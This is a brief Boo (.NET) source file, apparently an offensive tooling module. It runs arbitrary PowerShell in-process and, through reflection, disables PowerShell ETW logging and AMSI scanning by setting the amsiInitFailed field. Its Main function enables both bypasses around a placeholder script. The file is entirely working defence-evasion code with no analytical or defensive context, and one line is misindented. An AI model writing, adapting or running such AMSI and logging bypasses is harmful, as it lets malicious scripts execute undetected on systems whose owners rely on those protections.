import System
import System.Reflection
import System.Diagnostics
import System.Management.Automation

public static def PowerShellExecute(PowerShellCode as string, OutString as bool, BypassLogging as bool, BypassAmsi as bool) as string:
    using ps = PowerShell.Create():
        flags = BindingFlags.NonPublic | BindingFlags.Static
        if BypassLogging:
            PSEtwLogProvider = ps.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider")
            if PSEtwLogProvider is not null:
                EtwProvider = PSEtwLogProvider.GetField("etwProvider", flags)
                EventProvider = Eventing.EventProvider(Guid.NewGuid())
                EtwProvider.SetValue(null, EventProvider)

        if BypassAmsi:
            amsiUtils = ps.GetType().Assembly.GetType("System.Management.Automation.AmsiUtils")
            if amsiUtils is not null:
                amsiUtils.GetField("amsiInitFailed", flags).SetValue(null, true)

        ps.AddScript(PowerShellCode)
        if OutString:
            ps.AddCommand("Out-String")
        results = ps.Invoke()
        output = array(item.ToString().Replace("\n", '') for item in results)
        ps.Commands.Clear()

       return join(output)

public static def Main():
    print PowerShellExecute(PowerShellCode='POWERSHELL_SCRIPT', OutString=true, BypassLogging=true, BypassAmsi=true)
